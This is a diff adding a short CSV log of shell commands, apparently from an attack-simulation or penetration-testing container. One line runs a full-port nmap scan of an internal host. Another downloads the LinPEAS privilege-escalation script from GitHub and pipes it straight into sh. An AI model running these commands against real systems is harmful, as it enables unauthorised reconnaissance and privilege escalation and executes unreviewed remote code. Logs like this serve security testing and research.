@@ -1,0 +1,3 @@
+docker_id;generation;full_time;service;command
+874770b5-68f6-4551-9b83-af233454ba59;1;2025-10-15 15:40:43;-1;nmap -T4 -p- 10.0.0.15 -v
+874770b5-68f6-4551-9b83-af233454ba59;1;2025-10-15 15:41:49;4;curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
